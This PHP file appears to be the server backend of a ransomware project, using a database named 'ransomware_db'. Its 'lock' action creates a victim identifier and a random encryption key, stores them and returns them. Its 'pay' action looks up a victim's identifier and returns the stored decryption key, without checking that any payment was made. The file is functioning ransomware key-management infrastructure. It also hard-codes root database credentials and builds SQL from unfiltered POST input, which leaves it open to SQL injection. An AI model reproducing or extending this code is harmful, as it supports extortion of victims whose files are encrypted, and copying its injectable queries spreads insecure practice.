<?php
    header('Content-type: application/json');
    header('Accept: application/json');
    // $POST = json_decode(file_get_contents('php://input'), true);
    $action = $_POST["action"];
    switch($action)
    {
        case "PAY" : pay();
                     break;
        default:
            lock();

    }

    function databaseConnection()
    {
        $servername = "localhost";
        $username = "root";
        $password = "root";
        $dbname = "ransomware_db";

        $conn = new mysqli($servername, $username, $password, $dbname);
        if ($conn->connect_error)
        {
            return null;
        }
        else{
            return $conn;
        }
    }

    function lock(){
        $conn = databaseConnection();
        
        // We create the unique identifier for the user, with the key the is going to be used for
        // encrypting their files
        $uuid_16 = bin2hex(openssl_random_pseudo_bytes(8));
        $key_16 = bin2hex(openssl_random_pseudo_bytes(8));
        
        $sql = "INSERT INTO ransomware_db.Keys (uuid_16, key_16) 
                    VALUES ('$uuid_16','$key_16')";
        mysqli_query($conn, $sql);
        sendJson($uuid_16,$key_16); 
    }

    function pay(){
        // $POST = json_decode(file_get_contents('php://input'), true);
        $conn = databaseConnection();
        $uuid = $_POST["uuid"];
        $sql = "SELECT *
                FROM ransomware_db.Keys
                WHERE uuid_16 = '$uuid'";
        $result = $conn -> query($sql);
        if ($result -> num_rows > 0){
            $row = $result->fetch_assoc();
            sendJson($row["uuid_16"],$row["key_16"]);
        }
        die();
    }

    function sendJson($uuid, $key){
        $response->uuid = $uuid;
        $response->key = $key;
        echo json_encode ($response);
        die();
    }


    
    
?>